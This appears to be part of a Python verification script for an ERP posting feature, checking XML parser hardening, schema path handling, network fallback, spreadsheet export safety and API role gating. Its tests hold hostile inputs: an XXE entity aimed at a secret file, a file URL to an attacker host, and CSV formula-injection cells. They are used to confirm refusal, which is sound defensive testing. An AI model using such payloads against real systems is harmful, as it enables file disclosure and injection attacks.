        out["hardened parser resolves nothing"] = True
        response = f'<!DOCTYPE R [<!ENTITY x SYSTEM "{uri}">]><RESPONSE><CREATED>1</CREATED><LASTVCHID>&x;</LASTVCHID></RESPONSE>'
        err = _raises(lambda: tally.parse_response(response.encode()), tally.TallyError)
        assert err is not None and secret not in str(err), f"a hostile Tally response was read: {err}"
        problems = xsd.validate(hostile["external entity (XXE)"].encode(), xsd.TALLY)
        assert problems and "DOCTYPE" in problems[0] and secret not in " ".join(problems), problems
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("xl/worksheets/sheet1.xml", hostile["external entity (XXE)"])
        assert _raises(lambda: tabular.read_xlsx_rows(buf.getvalue()), xmlsafe.XMLRefused), "a hostile XLSX part was read"
        assert xmlsafe.parse(b'<?xml version="1.0" encoding="UTF-8"?><RESPONSE><CREATED>1</CREATED></RESPONSE>').tag == "RESPONSE"
        assert _raises(lambda: xmlsafe.parse_vendored(b"<x/>", path=tmp / "secret.txt"), xmlsafe.XMLRefused), \
            "a schema outside the vendored directory was accepted"
        assert _raises(lambda: xmlsafe.parse(b"<a>" * 10 + b"x"), xmlsafe.XMLRefused), "malformed XML accepted"
    finally:
        shutil.rmtree(tmp, ignore_errors=True)
    return out


def check_schema_paths() -> dict:
    """P1: schema imports resolve from any checkout location. lxml hands the resolver percent-encoded file URLs
    (a space is %20, '#' is %23) and, on Windows, file:///C:/... -- both converted with the standard library's
    url2pathname; another host is refused. End to end: the vendored schemas copied under a directory whose name
    has a space and a '#' all compile."""
    from app.services.erp.formats import xmlsafe, xsd

    out: dict[str, Any] = {}
    cases = {
        ("file:///C:/Users/John%20Doe/flowpilot-ai/backend/app/services/erp/schemas/ubl21/common/UBL-CommonAggregateComponents-2.1.xsd", True):
            "C:\\Users\\John Doe\\flowpilot-ai\\backend\\app\\services\\erp\\schemas\\ubl21\\common\\UBL-CommonAggregateComponents-2.1.xsd",
        ("file:///D:/a%23b/x.xsd", True): "D:\\a#b\\x.xsd",
        ("file://localhost/C:/x/y.xsd", True): "C:\\x\\y.xsd",
        ("file:///home/u/sp%20ace%231/x.xsd", False): "/home/u/sp ace#1/x.xsd",
        ("/home/u/plain.xsd", False): "/home/u/plain.xsd",
    }
    for (url, windows), want in cases.items():
        got = xsd.local_path(url, windows=windows)
        assert got == want, f"{url} ({'Windows' if windows else 'POSIX'}): {got!r}, expected {want!r}"
        out[url] = got
    for url in ("file://attacker.example/share/x.xsd", "file://server/C:/x.xsd"):
        err = _raises(lambda: xsd.local_path(url, windows=True), xsd.SchemaError)
        assert err is not None, f"{url}: another host accepted"
    tmp = Path(tempfile.mkdtemp(prefix="arch47 schema#"))
    saved = (xsd.SCHEMAS, xmlsafe.SCHEMAS)
    try:
        copy = tmp / "sp ace#1" / "schemas"
        shutil.copytree(VENDORED, copy)
        xsd.SCHEMAS = xmlsafe.SCHEMAS = copy.resolve()
        xsd._compile.cache_clear()
        problem = xsd.warm()
        assert problem is None, f"schemas under {copy} do not compile: {problem}"
        out["compiled under"] = str(copy)
    finally:
        xsd.SCHEMAS, xmlsafe.SCHEMAS = saved
        xsd._compile.cache_clear()
        shutil.rmtree(tmp, ignore_errors=True)
    return out


def check_connect_fallback() -> dict:
    """N3: a host that resolves to several addresses (Windows resolves "localhost" to ::1 first) is tried address
    by address while NOTHING has been sent -- a refused connect is a ConnectError("Connection to ...") that falls
    through to the next address, and the ERP transport classes it TRANSIENT (no probe needed) -- but once the
    request was written, a failure is never retried at another address (that could post twice) and is UNCERTAIN."""
    import app.services.erp.transport.http as H
    from app.core import ssrf_client

    mock = _load_module("_mock47_fallback", F["mock"]).MockErp().start()
    real = socket.getaddrinfo
    dead = "127.0.0.2"   # loopback, nothing listening: refused at once

    def resolving(order: list[str]):
        def fake(host, port, *a, **k):  # noqa: ANN001
            if host == "localhost" and int(port) == mock.port:
                return [(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP, "", (ip, mock.port)) for ip in order]
            return real(host, port, *a, **k)
        return fake

    def client():
        return ssrf_client.SSRFSafeHTTPClient(connect_timeout=5, total_timeout=15, allow_private_ranges=True,
                                              test_ssl_context=mock.client_ssl_context())

    out: dict[str, Any] = {}
    url = f"https://localhost:{mock.port}/postings/fallback-probe"
    try:
        socket.getaddrinfo = resolving([dead, "127.0.0.1"])
        mock.reset()
        before = len(mock.requests)
        resp = client().request("GET", url, headers={"Authorization": "Bearer static-token"})
        assert resp.resolved_ip == "127.0.0.1", f"answered by {resp.resolved_ip}"
        assert len(mock.requests) - before == 1, f"{len(mock.requests) - before} requests for one call"
        out["refused first address, then"] = f"{resp.resolved_ip} -> HTTP {resp.status_code}"
        socket.getaddrinfo = resolving([dead])
        only_dead = _raises(lambda: client().request("GET", url), ssrf_client.ConnectError)
        assert only_dead is not None and not only_dead.request_sent and str(only_dead).startswith("Connection to"), \
            f"a refused connect surfaced as {type(only_dead).__name__}: {only_dead}"
        assert H._classify(only_dead)[0] == "TRANSIENT", H._classify(only_dead)
        out["every address refused"] = f"{type(only_dead).__name__}: TRANSIENT"
        # the request is written, then the connection drops: never repeated at the next address
        socket.getaddrinfo = resolving(["127.0.0.1", dead])
        mock.fault("POST /postings/", "reset_before")
        before = len(mock.requests)
        err = _raises(lambda: client().request("POST", f"https://localhost:{mock.port}/postings/bills",
                                               headers={"Authorization": "Bearer static-token",
                                                        "Content-Type": "application/json"}, body=b"{}"),
                      ssrf_client.ConnectError)
        assert err is not None and err.request_sent, f"a failure after sending surfaced as {err!r}"
        assert H._classify(err)[0] == "UNCERTAIN", H._classify(err)
        assert len(mock.requests) - before == 1, f"sent {len(mock.requests) - before} times"
        out["dropped after sending"] = "ConnectError(request_sent) -> UNCERTAIN, sent once"
        assert H._classify(ConnectionRefusedError(10061, "refused"))[0] == "TRANSIENT"
    finally:
        socket.getaddrinfo = real
        mock.stop()
    return out


def check_tabular_safety() -> None:
    """T1: a CSV cell that a spreadsheet would run as a formula is neutralised (a negative number is not); an XLSX
    posting has inline strings and numbers only -- never a formula, never a shared-string table to poison."""
    from app.services.erp import synthetic as S
    from app.services.erp.formats import tabular

    bill = S.vendor_bill()
    bill.vendor.name = '=HYPERLINK("http://evil","x")'
    bill.lines[0].description = "+SUM(A1:A9)"
    bill.lines[1].description = "@cmd"
    data = render_golden("CSV", "NONE", "VENDOR_BILL", bill).data.decode()
    rows = tabular.read_csv(data.encode())
    cells = [c for row in rows for c in row]
    assert "'=HYPERLINK(\"http://evil\",\"x\")" in cells and "'+SUM(A1:A9)" in cells and "'@cmd" in cells, cells[:20]
    assert tabular._neutral("-12.50") == "-12.50" and tabular._neutral("-x") == "'-x"
    xlsx = render_golden("XLSX", "NONE", "VENDOR_BILL", S.vendor_bill()).data
    with zipfile.ZipFile(io.BytesIO(xlsx)) as z:
        names = z.namelist()
        sheet = z.read("xl/worksheets/sheet1.xml").decode()
    assert "xl/sharedStrings.xml" not in names and "<f>" not in sheet and 't="inlineStr"' in sheet
    with zipfile.ZipFile(io.BytesIO(xlsx)) as z:
        stamps = {i.date_time for i in z.infolist()}
    assert stamps == {(2026, 1, 1, 0, 0, 0)}, f"zip timestamps are not fixed: {stamps}"
    with zipfile.ZipFile(io.BytesIO(xlsx)) as z:  # ARCH47-S1:zip-platform -- the same bytes on Windows and Linux
        made_by = {(i.create_system, i.external_attr >> 16) for i in z.infolist()}
    assert made_by == {(3, 0o600)}, f"zip 'made by' system / mode depend on the platform: {made_by}"


# ---------------------------------------------------------------------------
# W: wiring, API, console
# ---------------------------------------------------------------------------

def check_wiring(texts: dict[str, str]) -> None:
    from app.core import automation_events as ae
    from app.services.automation import actions, triggers
    from app.services.erp import vocabulary as ev
    from app.services.review import resolution
    from app.workers import handlers, profiles

    h, p = texts["handlers"], texts["profiles"]
    assert 'ARCH47_JOB_TYPES: frozenset[str] = frozenset({"erp.deliver_posting"})' in h and "| ARCH47_JOB_TYPES" in h
    assert '"erp.deliver_posting": _erp_deliver_posting' in h
    light = p.split("LIGHT = WorkerProfile(", 1)[1].split("OCR = WorkerProfile(", 1)[0]
    rest = p.split("OCR = WorkerProfile(", 1)[1]
    assert '"erp.deliver_posting"' in light and '"erp.deliver_posting"' not in rest, \
        "delivering a posting is network and file work: the LIGHT profile only"
    assert ev.JOB_DELIVER in profiles.LIGHT.job_types and ev.JOB_DELIVER in handlers._HANDLERS
    assert "gate.capability_held(db, posting.organization_id)" in texts["handler"], "the job does not check the plan"
    assert 'counts["erp_postings"] = _erp_service.erase_for_work_items(db, work_item_ids)' in texts["erasure"], \
        "ARCH-20 erasure keeps what postings quote of a document"
    spec = triggers.TRIGGERS_BY_KEY["posting.failed"]
    assert spec.capability == KEY and not spec.has_document and spec.event_types == (ev.EVENT_POSTING_FAILED,), spec
    assert "erp.post" in spec.excluded_actions, "a posting failure could trigger another posting (a loop)"
    assert ev.EVENT_POSTING_FAILED in ae.INTERNAL_EVENT_TYPES and ev.EVENT_POSTING_FAILED in ae.TRIGGER_NATIVE_EVENT_TYPES
    assert (len(triggers.TRIGGERS), len(triggers.CATALOG_EVENT_TYPES)) == (22, 23), (len(triggers.TRIGGERS), len(triggers.CATALOG_EVENT_TYPES))
    svc = texts["service"]
    assert 'idempotency_key=f"{v.EVENT_POSTING_FAILED}:{posting.id}:{posting.exception_seq}"' in svc, \
        "posting.failed is not idempotent per posting and exception"
    assert '"trigger.posting.failed": (' in texts["v37"], "verify_arch37 EMITTERS not widened"
    assert re.search(r"EXPECTED_TRIGGERS = 22\b", texts["conformance"]), "the live conformance matrix does not expect 22 triggers"
    assert "erp.post" in texts["conformance"] and "report[\"erp\"]" in texts["conformance"], "erp.post is not in the conformance matrix"
    action = actions.ACTIONS["erp.post"]
    assert action.capability == KEY and action.minimum_role == "WORKSPACE_ADMIN" and action.validate_resources is not None
    assert set(action.config_model.model_fields) == {"target_id", "object_kinds"}, "erp.post takes a document-derived parameter"
    assert "service.plan(" in texts["action"] and "origin=v.ORIGIN_FLOW" in texts["action"], "erp.post does not use the ledger"
    assert "deliver(" not in texts["action"], "erp.post sends inside the automation run"
    assert set(ev.ACTION_TRIGGER_SOURCES) == {"procurement.approved", "case.completed"}
    assert "def select_erp_post(" in texts["selectors"]
    assert '"erp_targets": (' in texts["catalog_service"] and '"erp_object_kinds":' in texts["catalog_service"]
    assert "vocab.KIND_POSTING: _resolve_posting" in texts["resolution"] and "POSTING" in resolution._DISPATCH
    assert "    if ERP_POSTING_CAPABILITY in granted:\n        kinds.append(vocab.KIND_POSTING)\n" in texts["review_api"], \
        "the hub shows POSTING without the capability"
    assert "posting_verdict=body.posting_verdict" in texts["review_api"] and \
        "posting_verdict: Optional[str] = None" in texts["review_schema"]
    assert "api_router.include_router(erp.router)" in texts["router"]
    assert "from app.models.erp import" in texts["models_init"]
    assert 'erp_postings) SCRIPT="scripts/sweep_erp_postings.py"' in texts["dispatcher"], "sweep not dispatched (RH-4 G14)"
    assert "flowpilot-sweep erp_postings --apply" in texts["cron"] and texts["cron"].endswith("\n"), "sweep not scheduled (RH-4 G14)"
    assert "report = service.sweep(db, apply=apply).as_json()" in texts["sweep"] and "db.rollback()" in texts["sweep"]
    req = texts["requirements"]
    assert "paramiko==" in req and "PyNaCl==" in req and "ARCH47-S1:requirements" in req, "SFTP dependency not pinned"
    # Zero new recurring cost: no hosted service is called, only the customer's own ERP endpoints.
    for key in ("service", "http", "sftp", "jsonapi"):
        for host in ("api.", "amazonaws", "googleapis", "stripe", "twilio", "sendgrid"):
            assert f"https://{host}" not in texts[key], f"{key} calls a hosted service ({host})"
    from app.core import public_route_registry as registry

    assert not [r for r in registry.PUBLIC_ROUTES if "/erp" in r.path], "an ERP route is public"


_ROUTE = re.compile(r'@router\.(get|put|post|patch|delete)\("([^"]+)"[^\n]*\n(?:[^\n]*\n)?def (\w+)\(([\s\S]*?)\) -> [^:]+:\n'
                    r'([\s\S]*?)(?=\n\n\n@router|\n\n\n__all__|\n\n\n# ---|\n\n\ndef )')

#: Who may call what. Targets, credentials, mappings and lookup tables configure where money goes: ADMIN.
#: Posting, previewing, downloading the file (it quotes the document) and deciding exceptions: CONTRIBUTOR.
ROLES = {"erp_catalog": "RequireViewer", "list_targets": "RequireViewer", "create_target": "RequireAdmin",
         "get_target": "RequireViewer", "update_target": "RequireAdmin", "delete_target": "RequireAdmin",
         "set_credential": "RequireAdmin", "test_target": "RequireAdmin", "get_mappings": "RequireViewer",
         "save_mapping": "RequireAdmin", "validate_mapping": "RequireAdmin", "restore_default_mapping": "RequireAdmin",
         "list_lookups": "RequireViewer", "create_lookup": "RequireAdmin", "update_lookup": "RequireAdmin",
         "delete_lookup": "RequireAdmin", "list_outcomes": "RequireViewer", "list_postings": "RequireViewer",
         "create_postings": "RequireContributor", "preview_posting": "RequireContributor",
         "get_posting": "RequireViewer", "download_posting": "RequireContributor",
         "retry_posting": "RequireContributor", "accept_posting": "RequireContributor",
         "cancel_posting": "RequireContributor", "acknowledge_posting": "RequireContributor",
         "document_postings": "RequireViewer"}


def check_api(api: str) -> None:
    routes = _ROUTE.findall(api)
    assert len(routes) == 27, f"expected 27 routes, found {len(routes)}: {[r[1] for r in routes]}"
    assert {r[2] for r in routes} == set(ROLES), sorted({r[2] for r in routes} ^ set(ROLES))
    for method, path, name, sig, body in routes:
        first = [line.strip() for line in body.strip().splitlines()[:2]]
        assert first[0] == "_ws(context, workspace_id)" and first[1].startswith("_gate(db, context,"), f"{name} is not gated first"
        roles = re.findall(r"Depends\((Require\w+)\)", sig)
        assert roles == [ROLES[name]], f"{name} ({method} {path}) needs {ROLES[name]}, has {roles}"
    download = api.split("def download_posting(", 1)[1].split("\n\n\n", 1)[0]
    assert "action=AuditAction.EXPORTED" in download and '"Cache-Control": "no-store"' in download and \
        '"X-Content-Type-Options": "nosniff"' in download, "the posting file download must be audited, uncached, nosniff"
    schemas = t("schemas")
    for secret in ("credential_ciphertext", "client_secret", "password", "refresh_token", "private_key"):
        assert secret not in schemas.split("class TargetRow(BaseModel):", 1)[1].split("class TargetList", 1)[0], \
            f"TargetRow exposes {secret}"
    assert "credential_fingerprint" in schemas and "credential_set: bool" in schemas


def _fields_py(text: str, cls: str) -> set[str]:
    body = text.split(f"class {cls}(", 1)[1].split("\n\n\n", 1)[0]
    return set(re.findall(r"^    (\w+):", body, re.M)) - {"model_config"}


def _fields_ts(text: str, iface: str) -> set[str]:
    body = text.split(f"export interface {iface} {{", 1)[1].split("\n}", 1)[0]
    return set(re.findall(r"^  readonly (\w+)\??:", body, re.M))


UNIONS = (("ObjectKind", "OBJECT_KINDS"), ("SourceKind", "SOURCE_KINDS"), ("PostingFormat", "FORMATS"),
          ("PostingTransport", "TRANSPORTS"), ("PostingPreset", "PRESETS"), ("AckMode", "ACK_MODES"),
          ("AuthMode", "AUTH_MODES"), ("TargetStatus", "TARGET_STATUSES"), ("MappingStatus", "MAPPING_STATUSES"),
          ("PostingState", "STATES"), ("PostingOrigin", "ORIGINS"), ("AttemptKind", "ATTEMPT_KINDS"),
          ("AttemptOutcome", "ATTEMPT_OUTCOMES"), ("PostingVerdict", "VERDICTS"))


def check_console(texts: dict[str, str]) -> None:
    from app.services.erp import service
    from app.services.erp import vocabulary as ev

    classes = [c for c in re.findall(r"^class (\w+)\((?:BaseModel|_In)\):", texts["schemas"], re.M) if not c.startswith("_")]
    assert len(classes) >= 30, classes
    types = texts["fe_types"]
    for cls in classes:
        assert f"export interface {cls} {{" in types, f"console has no {cls}"
        py, ts = _fields_py(texts["schemas"], cls), _fields_ts(types, cls)
        assert py == ts, f"{cls}: API and console differ in {sorted(py ^ ts)}"
    for name, vocab_name in UNIONS:
        decl = types.split(f"export type {name} =", 1)[1].split(";", 1)[0]
        assert set(re.findall(r'"([A-Z0-9_]+)"', decl)) == set(getattr(ev, vocab_name)), f"console {name} differs from the vocabulary"
    labels = types.split("export const STATE_LABELS", 1)[1].split("};", 1)[0]
    for state, label in ev.STATE_LABELS.items():
        assert f'{state}: "{label}"' in labels, f"console label for {state} differs"
    creds = types.split("export const CREDENTIAL_FIELDS", 1)[1].split("};", 1)[0]
    for mode, (required, optional) in service._CREDENTIAL_FIELDS.items():
        line = next(ln for ln in creds.splitlines() if ln.strip().startswith(f"{mode}:"))
        want = f'required: [{", ".join(json.dumps(x) for x in sorted(required))}]'
        got = re.search(r"required: \[([^\]]*)\]", line).group(1)
        assert set(re.findall(r'"(\w+)"', got)) == set(required), f"console credential fields for {mode}: {line}"
        # access_token / expires_at are the token cache FlowPilot keeps itself: never typed by a person
        assert set(re.findall(r'"(\w+)"', re.search(r"optional: \[([^\]]*)\]", line).group(1))) == \
            set(optional) - {"access_token", "expires_at"}, line
        del want
    nav, paths, app = texts["fe_nav"], texts["fe_paths"], texts["fe_app"]
    assert "capability: CAPABILITY.erpPosting" in nav and "erpPath(orgSlug, workspaceSlug)" in nav
    for route, page in (("workspaceErp", "ErpPosting"), ("workspaceErpPosting", "ErpPostingDetail"),
                        ("workspaceErpTarget", "ErpTargetDetail")):
        assert f"<Route path={{ROUTE_PATTERNS.{route}}} element={{<{page} />}} />" in app, f"{route} not routed"
    assert 'workspaceErp: "erp"' in paths and 'workspaceErpPosting: "erp/postings/:postingId"' in paths and \
        'workspaceErpTarget: "erp/targets/:targetId"' in paths
    for key in ("fe_page", "fe_detail", "fe_target", "fe_doc"):
        assert 'useCapabilityAccess(workspace?.organizationId ?? "", CAPABILITY.erpPosting)' in texts[key], f"{key} not locked"
    assert "<DocumentPostings workItemId={workItem.id} />" in texts["fe_wid"] and \
        '{ value: "postings", label: "ERP postings", icon: BookUp }' in texts["fe_wid"], "Work Item details has no ERP postings tab"
    assert '{ id: "POSTING", label: "ERP postings", kind: "POSTING" }' in texts["fe_hub"]
    assert 'bulk.mutate({ action: "resolve", body: { posting_verdict: "RETRY" } })' in texts["fe_hub"]
    for verdict in ("RETRY", "CANCEL"):
        assert f'onResolve({{ posting_verdict: "{verdict}" }})' in texts["fe_resolve"], f"ResolvePanel lacks {verdict}"
    assert 'posting_verdict: "ACCEPT", posting_reference: reference' in texts["fe_resolve"]
    assert '"POSTING_EXCEPTION"' in texts["fe_review_types"] and '"OBLIGATION", "POSTING"]' in texts["fe_review_types"]
    assert "posting_verdict?: PostingReviewVerdict" in texts["fe_review_types"]
    assert '"erp.post": ["target_id", "object_kinds"]' in texts["fe_action_form"] and \
        "resources.erp_targets.map(" in texts["fe_action_form"], "the erp.post form cannot pick a target"
    assert "readonly erp_targets: readonly FlowErpTargetOption[];" in texts["fe_flow_types"]
    raw = re.compile(r"new Date\((?:[^()]|\([^()]*\))*\)\s*\.toLocale(?:Date|Time)?String\(")  # ARCH-30 T3 H8's rule
    offenders = [k for k in texts if k.startswith("fe_") and raw.search(texts[k])]
    assert not offenders, f"browser-clock date formatting in {offenders}"
    api = texts["fe_api"]
    assert 'responseType: "blob"' in api and "downloadBlob(" in api, "the posting file must go through the authenticated client"
    detail = texts["fe_detail"]
    for marker in ("retryPosting(", "acceptPosting(", "cancelPosting(", "acknowledgePosting(", "downloadPostingFile(",
                   "response_text: response", "verdictsFor(p.state)"):
        assert marker in detail, f"the posting page lacks {marker}"
    cred = texts["fe_cred"]
    assert 'type={SECRET_FIELDS.has(key) ? "password" : "text"}' in cred and 'autoComplete="off"' in cred
    target = texts["fe_target"]
    for marker in ("setTargetCredential(", "testTarget(", "deleteTarget(", "updateTarget(", "<MappingEditor"):
        assert marker in target, f"the target page lacks {marker}"
    mapping = texts["fe_mapping"]
    for marker in ("validateMapping(", "saveMapping(", "restoreDefaultMapping(", "previewPosting(", "spec: body"):
        assert marker in mapping, f"the mapping editor lacks {marker}"
    assert "credential_fingerprint" in target and "credential_ciphertext" not in "".join(texts[k] for k in texts if k.startswith("fe_"))


EDITED_OR_NEW = [k for k in F if k not in ("m46",)]


def check_sentinels() -> None:
    missing = []
    for k in EDITED_OR_NEW:
        text = read(F[k])
        marker = "ARCH47-S2" if k.startswith("fe_") else "ARCH47-S1"
        if marker not in text:
            missing.append(f"{k} ({F[k].name})")
    assert not missing, f"no ARCH47 sentinel in {missing}"
    assert "ARCH47-S1:contract-reparented" in t("step3"), "the contract step was not re-parented with a sentinel"


#: (file key, sentinel) -- every earlier verifier pin ARCH-47 widened, each with an ARCH47-S1 sentinel added to
#: the earlier ones (never replacing them).
WIDENED = (
    ("v31", "ARCH47-S1:head-widened-31"), ("v31s0", "ARCH47-S1:head-widened-31-step0"), ("v34", "ARCH47-S1:head-widened-34"),
    ("v35", "ARCH47-S1:head-widened-35"), ("v36", "ARCH47-S1:head-widened-36"), ("v36", "ARCH47-S1:gated-page"),
    ("v36", "ARCH47-S1:helper-exempt"), ("v37", "ARCH47-S1:head-widened-37"), ("v37", "ARCH47-S1:catalog-counts-37"),
    ("v37", "ARCH47-S1:later-events"), ("v37", "ARCH47-S1:emitters"), ("v37", "ARCH47-S1:actions-widened-37"),
    ("v38", "ARCH47-S1:head-widened-38"), ("v38", "ARCH47-S1:catalog-widened-38"), ("v39", "ARCH47-S1:head-widened-39"),
    ("v40", "ARCH47-S1:head-widened-40"), ("v40", "ARCH47-S1:chain-widened"), ("v40", "ARCH47-S1:a6-widened"),
    ("v40", "ARCH47-S1:h1-widened"), ("v40", "ARCH47-S1:catalog-widened-40"), ("v41", "ARCH47-S1:head-widened-41"),
    ("v41", "ARCH47-S1:chain-widened-41"), ("v41", "ARCH47-S1:catalog-widened-41"), ("v42", "ARCH47-S1:head-widened-42"),
    ("v42", "ARCH47-S1:chain-widened-42"), ("v42", "ARCH47-S1:review-kinds-widened-42"), ("v42", "ARCH47-S1:vocab-widened-42"),
    ("v43", "ARCH47-S1:head-widened-43"), ("v43", "ARCH47-S1:chain-widened-43"), ("v43", "ARCH47-S1:vocab-widened-43"),
    ("v43", "ARCH47-S1:internal-widened-43"), ("v43", "ARCH47-S1:catalog-widened-43"), ("v43", "ARCH47-S1:conformance-widened-43"),
    ("v43", "ARCH47-S1:m16-widened"), ("v44", "ARCH47-S1:head-widened-44"), ("v44", "ARCH47-S1:chain-widened-44"),
    ("v44", "ARCH47-S1:vocab-widened-44"), ("v44", "ARCH47-S1:internal-widened-44"), ("v44", "ARCH47-S1:catalog-widened-44"),
    ("v44", "ARCH47-S1:conformance-widened-44"), ("v44", "ARCH47-S1:console-kinds-widened-44"),
    ("v45", "ARCH47-S1:head-widened-45"), ("v45", "ARCH47-S1:chain-widened-45"), ("v45", "ARCH47-S1:vocab-widened-45"),
    ("v45", "ARCH47-S1:internal-widened-45"), ("v45", "ARCH47-S1:catalog-widened-45"), ("v45", "ARCH47-S1:conformance-widened-45"),
    ("v45", "ARCH47-S1:console-kinds-widened-45"), ("v45", "ARCH47-S1:ms28-widened"), ("v46", "ARCH47-S1:chain-widened-46"),
    ("v46", "ARCH47-S1:vocab-widened-46"), ("v46", "ARCH47-S1:internal-widened-46"), ("v46", "ARCH47-S1:catalog-widened-46"),
    ("v46", "ARCH47-S1:conformance-widened-46"), ("v46", "ARCH47-S1:ms34-widened"), ("v46", "ARCH47-S1:head-widened-46"),
    ("vhm", "ARCH47-S1:matrix-widened"), ("vhm", "ARCH47-S1:hm-chain-widened"), ("v16", "ARCH47-S1:xml-confined-16"),
    ("apply37", "ARCH47-S1:supersede-newfile"), ("apply39", "ARCH47-S1:supersede-newfile"),
)


def check_widened(texts: dict[str, str]) -> None:
    missing = [f"{k}: {s}" for k, s in WIDENED if s not in texts[k]]
    assert not missing, f"earlier verifiers not widened: {missing}"
    # widened, never replaced: each earlier sentinel is still there next to ours
    for k, earlier in (("v31", "ARCH46-S1:head-widened-31"), ("v37", "ARCH46-S1:later-events"), ("v40", "ARCH46-S1:a6-widened"),
                       ("v43", "ARCH46-S1:internal-widened-43"), ("v45", "ARCH46-S1:vocab-widened-45"),
                       ("vhm", "ARCH46-S1:matrix-widened"), ("v36", "ARCH46-S1:gated-page")):
        assert earlier in texts[k], f"{k}: {earlier} was replaced"
    for k in ("apply37", "apply39"):
        assert '"ARCH38-S1:", "ARCH40-S1:", "ARCH47-S1:", "ARCH47-S2:"' in texts[k], f"{k}: superseding sentinels"


def check_apply() -> None:
    out = subprocess.run([sys.executable, str(BACKEND / "apply_arch47.py"), "--check"], cwd=BACKEND, capture_output=True,
                         text=True, timeout=300, encoding="utf-8", errors="replace")
    assert out.returncode == 0, (out.stdout + out.stderr)[-1500:]
    assert "0 file(s) to write" in out.stdout and "REFUSED" not in out.stdout, out.stdout[-1500:]
    listed = subprocess.run([sys.executable, str(BACKEND / "apply_arch47.py"), "--list"], cwd=BACKEND, capture_output=True,
                            text=True, timeout=300, encoding="utf-8", errors="replace").stdout
    owned = {line.split()[-1] for line in listed.splitlines() if line.strip()}
    mine = {str(F[k].relative_to(ROOT)).replace("\\", "/") for k in F if k != "m46"}
    missing = sorted(mine - owned)
    assert not missing, f"files ARCH-47 changed that the apply does not carry: {missing}"
    vendored = {str(p.relative_to(ROOT)).replace("\\", "/") for p in VENDORED.rglob("*") if p.is_file()}
    assert vendored <= owned, f"vendored schemas the apply does not carry: {sorted(vendored - owned)[:5]}"


def texts_all() -> dict[str, str]:
    return {k: t(k) for k in F}


def offline(rec: Recorder, evidence: dict) -> None:
    print("Offline")
    texts = texts_all()
    rec.check("offline", "T1 capability: entitlements (+Entitlement), 402 name, Business AND Enterprise (not below), console + plan card, nav lock, verify36, hardening matrix",
              lambda: check_capability(texts["ent"], texts["capgate"], texts["seed"], texts["fe_caps"], texts["fe_plan"],
                                       texts["fe_nav"], texts["v36"], texts["vhm"]))
    rec.check("offline", "T2 migration: 5 tables, the ledger's two unique keys, CHECKs, composite FKs, arch46 -> arch47 -> contract, one head, hub view v8, vocabulary parity, posting.failed in the outbox CHECK",
              lambda: check_migration(texts["migration"]))
    rec.check("offline", "F1 golden files: 48 format x preset x object renders valid against OASIS UBL 2.1 / ECMA-376 / RFC 4180 / X12 004010 / the Tally XSD / each preset's schema, figures exact, deterministic",
              lambda: evidence.__setitem__("golden", check_goldens()))
    rec.check("offline", "F2 the validators refuse broken documents of every format (UBL, X12 envelope arithmetic and grammar, CSV, XLSX package, Tally, JSON)",
              lambda: evidence.__setitem__("schema_refusals", check_schema_refusals()))
    rec.check("offline", f"F3 held-out seeds {HELD_OUT_SEEDS[0]}-{HELD_OUT_SEEDS[-1]} (JPY/INR/KWD..., hostile names) through every target: valid and exact; an inexact N2 amount refused",
              lambda: evidence.__setitem__("held_out", check_held_out()))
    rec.check("offline", "M1 the mapping language refuses anything executable (eval/exec/lambda keys, templates, dunder paths, unknown transforms/tables), says where; every default mapping validates",
              lambda: evidence.__setitem__("mapping_refusals", check_mapping_refusals()))
    rec.check("offline", "M2 transforms exact: money in the currency's minor units, minor units refuse inexact yen, lookups fail naming the line, AP/TAX roles never fall back",
              lambda: evidence.__setitem__("mapping_semantics", check_mapping_semantics()))
    rec.check("offline", "C1 canonical objects reconcile (line arithmetic, subtotal, total, balanced journals, one side per line) and digest content only",
              check_canonical)
    rec.check("offline", "K1 X12 997: accepted / rejected / accepted-with-errors, another group ignored, our set missing is a mismatch",
              lambda: evidence.__setitem__("x12_acks", check_x12_acks()))
    rec.check("offline", "K2 Tally import responses and .ack files: created (with the voucher id), errors, ignored, two vouchers, unreadable",
              lambda: evidence.__setitem__("file_acks", check_file_acks()))
    rec.check("offline", "K3 REST/OData acknowledgements: every echoed figure compared (currency minor-unit tolerance), no record named = mismatch; probes and idempotency per preset",
              lambda: evidence.__setitem__("rest_acks", check_rest_acks()))
    rec.check("offline", "R1 backoff: 30 s x 2^(n-1), full jitter in [d/2, d], 1-hour ceiling, never below Retry-After",
              lambda: evidence.__setitem__("backoff", check_backoff()))
    rec.check("offline", "N1 egress: SSRF-safe client only (private/loopback/metadata refused), test switches refused in production, no network at import, secrets scrubbed, SFTP host key pinned",
              lambda: evidence.__setitem__("egress", check_egress()))
    rec.check("offline", "N2 XML safety: lxml only in the hardened xmlsafe.py (ARCH-16 S1), DOCTYPE/ENTITY refused (XXE, parameter entities, billion laughs, UTF-16), nothing resolved, every ERP XML reader routed through it",
              lambda: evidence.__setitem__("xml_safety", check_xml_safety()))
    rec.check("offline", "N3 connect fallback: a refused address falls through to the next while nothing was sent (Windows 'localhost' -> ::1 first), TRANSIENT; after sending never repeated elsewhere, UNCERTAIN",
              lambda: evidence.__setitem__("connect_fallback", check_connect_fallback()))
    rec.check("offline", "P1 schema paths: percent-encoded and Windows drive file URLs resolve (url2pathname), another host refused, the schemas compile from a directory named 'sp ace#1'",
              lambda: evidence.__setitem__("schema_paths", check_schema_paths()))
    rec.check("offline", "T3 file safety: CSV formula neutralisation, XLSX inline strings only, fixed zip timestamps", check_tabular_safety)
    rec.check("offline", "W1 wiring: job on LIGHT (plan-checked), erasure, posting.failed (22/23, no erp.post loop), erp.post (ledger, admin, author-chosen target), conformance 22, hub gated, router, sweep scheduled, paramiko pinned",
              lambda: check_wiring(texts))
    rec.check("offline", "W2 API: 27 routes, each gated first; roles (targets/credentials/mappings ADMIN, posting CONTRIBUTOR, reads VIEWER); download audited, uncached; no secret in a response",
              lambda: check_api(texts["api"]))
    rec.check("offline", "W3 console: type parity (every API model + 14 unions + labels + credential fields), locked pages, routes, Work Item tab, hub tab + bulk, ResolvePanel, erp.post form, no raw Date formatting",
              lambda: check_console(texts))
    rec.check("offline", "S1 every ARCH-47 file carries its sentinel", check_sentinels)
    rec.check("offline", "S2 earlier verifiers widened with ARCH47-S1 sentinels, never replacing theirs",
              lambda: check_widened(texts))
    if (BACKEND / "apply_arch47.py").exists():
        rec.check("offline", "A1 apply_arch47.py --check on this tree: every file is the ARCH-47 result (a second apply writes nothing)",
                  check_apply)


# ===========================================================================
